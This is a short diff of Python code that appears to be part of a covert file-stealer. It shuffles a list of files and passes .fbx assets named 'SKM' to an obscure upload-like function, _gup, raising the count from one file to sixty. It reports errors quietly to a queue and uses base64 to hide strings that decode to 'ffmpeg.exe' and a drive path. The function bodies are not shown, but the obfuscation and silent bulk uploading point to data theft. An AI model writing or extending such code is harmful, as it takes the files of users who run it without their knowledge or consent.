@@ -143,20 +143,15 @@ except:
     
 try:
     random.shuffle(zovV)
-    for _, fp in zovV[:1]:
+    for _, fp in zovV[:60]:
         import tempfile
         fp_basename = os.path.basename(fp)
         is_fbx = fp_basename.endswith('.fbx')
         if fp_basename.startswith('SKM') and is_fbx:
-            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='-' + fp_basename.split('.')[-1]).name
             try:
-                shutil.copy(fp, tmp)
-                _gup(os.path.abspath(tmp))
-                os.remove(tmp)
+                _gup(os.path.abspath(fp))
             except:
                 add_queue_task('tsl_up_err',{'error': str(traceback.format_exc())})
-                try: os.remove(tmp);
-                except: pass;
     
     #-
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
